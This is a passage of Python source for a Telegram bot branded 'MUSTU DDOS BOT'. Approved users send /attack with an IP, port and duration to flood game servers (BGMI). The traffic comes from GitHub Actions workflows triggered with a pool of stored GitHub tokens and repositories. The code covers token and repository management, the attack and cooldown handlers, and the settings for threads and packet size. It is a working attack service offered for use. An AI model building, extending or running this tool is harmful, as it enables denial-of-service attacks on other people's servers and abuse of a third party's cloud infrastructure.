async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle messages for adding/removing repos"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    text = update.message.text.strip()
    user_data = context.user_data
    
    # Handle token removal
    if user_data.get('awaiting_remove_token'):
        try:
            index = int(text) - 1
            if 0 <= index < len(GITHUB_ACCOUNTS):
                removed_account = GITHUB_ACCOUNTS.pop(index)
                save_config()
                
                token_preview = removed_account['token'][:15] + "..." if len(removed_account['token']) > 15 else removed_account['token']
                repo_count = len(removed_account['repos'])
                
                await update.message.reply_text(
                    f"✅ *TOKEN REMOVED!*\n\n"
                    f"🔑 Token: `{token_preview}`\n"
                    f"🗑️ Repos removed: {repo_count}\n\n"
                    f"📊 Remaining accounts: {len(GITHUB_ACCOUNTS)}",
                    parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("❌ Invalid token number.")
        except ValueError:
            await update.message.reply_text("❌ Please send a valid number.")
        
        user_data.pop('awaiting_remove_token', None)
        return
    
    # Handle adding new token
    if user_data.get('awaiting_token'):
        if not text.startswith(('ghp_', 'ghs_')):
            await update.message.reply_text("❌ Invalid GitHub token format. It should start with 'ghp_' or 'ghs_'")
            return
        
        user_data['new_token'] = text
        user_data['awaiting_token'] = False
        user_data['awaiting_repo_count'] = True
        
        await update.message.reply_text(
            "✅ Token received!\n\n"
            "📊 *Step 2/3:* How many repositories do you want to add? (Max: 10)\n"
            "Please send a number (e.g., 2):",
            parse_mode="Markdown"
        )
    
    # Handle repo count
    elif user_data.get('awaiting_repo_count'):
        try:
            count = int(text)
            if 1 <= count <= 10:
                user_data['repo_count'] = count
                user_data['repos_added'] = 0
                user_data['new_repos'] = []
                user_data['awaiting_repo_count'] = False
                user_data['awaiting_repos'] = True
                
                await update.message.reply_text(
                    f"✅ Great! You want to add {count} repositories.\n\n"
                    f"🔗 *Step 3/3:* Please send repository 1 in format: username/repo\n"
                    f"Example: prahajd/zjdjfjfj",
                    parse_mode="Markdown"
                )
            else:
                await update.message.reply_text("❌ Please enter a number between 1 and 10:")
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid number:")
    
    # Handle repository names
    elif user_data.get('awaiting_repos'):
        if '/' not in text or len(text.split('/')) != 2:
            await update.message.reply_text("❌ Invalid format. Please send in format: username/repo")
            return
        
        user_data['new_repos'].append(text)
        user_data['repos_added'] += 1
        
        if user_data['repos_added'] < user_data['repo_count']:
            await update.message.reply_text(
                f"✅ Repository {user_data['repos_added']} added!\n\n"
                f"Please send repository {user_data['repos_added'] + 1} in format: username/repo"
            )
        else:
            new_account = {
                'token': user_data['new_token'],
                'repos': user_data['new_repos']
            }
            
            GITHUB_ACCOUNTS.append(new_account)
            save_config()
            
            user_data.clear()
            
            token_preview = new_account['token'][:15] + "..." if len(new_account['token']) > 15 else new_account['token']
            
            await update.message.reply_text(
                f"🎉 *SUCCESS! NEW ACCOUNT ADDED*\n\n"
                f"🔑 Token: `{token_preview}`\n"
                f"📁 Repositories added: {len(new_account['repos'])}\n"
                f"📊 Total accounts: {len(GITHUB_ACCOUNTS)}\n"
                f"📈 Total repositories: {sum(len(acc['repos']) for acc in GITHUB_ACCOUNTS)}",
                parse_mode="Markdown"
            )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running, is_cooldown_active, cooldown_end_time, current_target, COOLDOWN_NOTIFICATION_SENT
    
    if not is_approved(update.effective_user.id):
        await update.message.reply_text("❌ Not approved.")
        return
    
    current_time = time.time()
    
    # Check if attack is already running
    if is_attack_running:
        await update.message.reply_text(
            f"⏳ *ATTACK IN PROGRESS*\n\n"
            f"🎯 Current Target: {current_target}\n\n"
            f"⚠️ Please wait for current attack to finish...",
            parse_mode="Markdown"
        )
        return
    
    # Check if cooldown is active
    if is_cooldown_active and current_time < cooldown_end_time:
        remaining_cooldown = cooldown_end_time - current_time
        cooldown_mins = int(remaining_cooldown // 60)
        cooldown_secs = int(remaining_cooldown % 60)
        
        await update.message.reply_text(
            f"❄️ *COOLDOWN ACTIVE*\n\n"
            f"⏰ Remaining Cooldown: {cooldown_mins:02d}:{cooldown_secs:02d}\n"
            f"📅 Cooldown ends at: {time.strftime('%H:%M:%S', time.localtime(cooldown_end_time))}\n\n"
            f"⚠️ Please wait {int(remaining_cooldown)} seconds before starting a new attack\n"
            f"✅ Other commands (/ping, /Myid, etc.) are still available!",
            parse_mode="Markdown"
        )
        return
    
    # Reset cooldown if it's over
    if is_cooldown_active and current_time >= cooldown_end_time:
        is_cooldown_active = False
    
    # Reset notification flag
    COOLDOWN_NOTIFICATION_SENT = False
    
    # Check command arguments
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        time_int = int(context.args[2])
        
        if time_int < 1:
            await update.message.reply_text("❌ Time must be at least 1 second.")
            return
            
        if time_int > MAX_ATTACK_TIME:
            await update.message.reply_text(f"❌ Time exceeds maximum allowed duration.\n⏱️ Maximum: {MAX_ATTACK_TIME} seconds")
            return
            
    except ValueError:
        await update.message.reply_text("❌ Invalid time. Time must be a number.")
        return

    # Start attack
    is_attack_running = True
    current_target = f"{ip}:{port}"
    
    attack_msg = f"""
⚡ 𝕄𝕌𝕊𝕋𝕌𝕌 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 ⚡️

🚀 ATTACK BY: @SIDIKI_MUSTAFA_92
🎯 TARGET: {ip}
🔌 PORT: {port}
⏰ TIME: {time_int}s
⏱️ MAX TIME SETTING: {MAX_ATTACK_TIME}s
📦 PACKET SIZE: {PACKET_SIZE}KB
🧵 THREADS: {THREADS}
❄️ COOLDOWN AFTER: {COOLDOWN_TIME}s (6 minutes)

🌎 GAME: BGMI
    """
    await update.message.reply_text(attack_msg)
    
    # Start attack execution in background without blocking
    asyncio.create_task(execute_attack(update, ip, port, time_int))
    
    await asyncio.sleep(10)
    await update.message.reply_text("🔥 Attack Processing Start 🔥")

async def manage_cooldown():
    """Manage cooldown in background and send notification when finished"""
    global is_cooldown_active, cooldown_end_time, COOLDOWN_NOTIFICATION_SENT, application
    
    while True:
        if is_cooldown_active:
            current_time = time.time()
            if current_time >= cooldown_end_time:
                is_cooldown_active = False
                
                # Send notification to admin
                if not COOLDOWN_NOTIFICATION_SENT:
                    try:
                        if application:
                            # Send message to admin
                            await application.bot.send_message(
                                chat_id=ADMIN_ID,
                                text="✅ *COOLDOWN COMPLETE!*\n\n"
                                     "⚡ Bot is now ready for new attacks!\n\n"
                                     "🎯 Use `/attack <ip> <port> <time>`\n"
                                     "📊 Check status with `/ping`",
                                parse_mode="Markdown"
                            )
                            COOLDOWN_NOTIFICATION_SENT = True
                            print("✅ Cooldown finished notification sent to admin")
                        else:
                            print("⚠️ Application not initialized yet")
                    except Exception as e:
                        print(f"⚠️ Failed to send cooldown notification: {e}")
                
                # Reset notification flag after sending
                await asyncio.sleep(1)
                COOLDOWN_NOTIFICATION_SENT = False
        
        await asyncio.sleep(1)  # Check every second

async def execute_attack(update, ip, port, duration):
    global is_attack_running, is_cooldown_active, cooldown_end_time, current_target, COOLDOWN_NOTIFICATION_SENT
    
    try:
        # Record attack start time
        attack_start_time = time.time()
        
        # Reset notification flag when attack starts
        COOLDOWN_NOTIFICATION_SENT = False
        
        # Trigger workflows
        triggered = await trigger_all_workflows_async(ip, port, duration)
        
        # Wait for attack duration - NON-BLOCKING WAY
        end_time = time.time() + duration
        while time.time() < end_time:
            await asyncio.sleep(1)  # Small sleep to not block
        
        # Attack completed, start cooldown
        is_attack_running = False
        is_cooldown_active = True
        cooldown_end_time = time.time() + COOLDOWN_TIME
        
        total_attack_time = time.time() - attack_start_time
        
        # Calculate cooldown end time
        cooldown_end_datetime = datetime.fromtimestamp(cooldown_end_time)
        cooldown_end_str = cooldown_end_datetime.strftime("%H:%M:%S")
        
        await update.message.reply_text(
            f"✅ *ATTACK COMPLETED!* 🎯\n\n"
            f"🎯 Target: {ip}:{port}\n"
            f"⏰ Attack Duration: {int(total_attack_time)} seconds\n"
            f"❄️ Cooldown Started: {COOLDOWN_TIME} seconds\n"
            f"⏳ Cooldown ends at: {cooldown_end_str}\n\n"
            f"📢 Notification will be sent when cooldown completes!\n"
            f"✅ Other commands are still available!",
            parse_mode="Markdown"
        )
        
    except Exception as e:
        is_attack_running = False
        await update.message.reply_text(f"❌ Attack error: {e}")

def main():
    global application
    
    print("""
    ╔══════════════════════════════════════════════╗
    ║    ⚡ MUSTU DDOS BOT STARTING...               ║
    ║    Commands: /attack, /Myid, /approve       ║
    ║    /remove, /addrepo, /removerepo, /listrepos║
    ║    /ping, /set_duration, /users             ║
    ║    /checkaccounts, /set_threads, /set_packets║
    ║    /set_cooldown                            ║
    ║    /approve_group, /remove_group, /list_groups║
    ║    Owner: @SIDIKI_MUSTAFA_92                ║
    ║                                             ║
    ║    📊 CONFIGURATION:                        ║
    ║    ✅ GitHub Tokens: {}                      ║
    ║    ✅ Repositories: {}                       ║
    ║    ✅ Approved Users: {}                     ║
    ║    ✅ Approved Groups: {}                    ║
    ║    ⏱️ Max Attack Time: {} seconds            ║
    ║    📦 Packet Size: {} KB                    ║
    ║    🧵 Threads: {}                           ║
    ║    ❄️ Cooldown Time: {} seconds ({} min)     ║
    ╚══════════════════════════════════════════════╝
    """.format(
        len(GITHUB_ACCOUNTS), 
        sum(len(acc['repos']) for acc in GITHUB_ACCOUNTS),
        len(approved_users) - 1,
        len(approved_groups),
        MAX_ATTACK_TIME,
        PACKET_SIZE,
        THREADS,
        COOLDOWN_TIME,
        COOLDOWN_TIME // 60
    ))
    
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    # Start cooldown manager in background
    asyncio.create_task(manage_cooldown())
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("Myid", Myid))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("addrepo", addrepo))
    application.add_handler(CommandHandler("removerepo", removerepo))
    application.add_handler(CommandHandler("listrepos", listrepos))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(CommandHandler("checkaccounts", checkaccounts))
    application.add_handler(CommandHandler("set_duration", set_duration))
    application.add_handler(CommandHandler("set_threads", set_threads))
    application.add_handler(CommandHandler("set_packets", set_packets))
    application.add_handler(CommandHandler("set_cooldown", set_cooldown))
    
    # Group commands
    application.add_handler(CommandHandler("approve_group", approve_group_command))
    application.add_handler(CommandHandler("remove_group", remove_group_command))
    application.add_handler(CommandHandler("list_groups", list_groups))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ Bot started!")
    
    application.run_polling(
        poll_interval=1.0,
        timeout=30,
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print("\n🛑 Bot stopped")
            break
        except Exception as e:
            print(f"⚠️ Bot crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            time.sleep(10)
            continue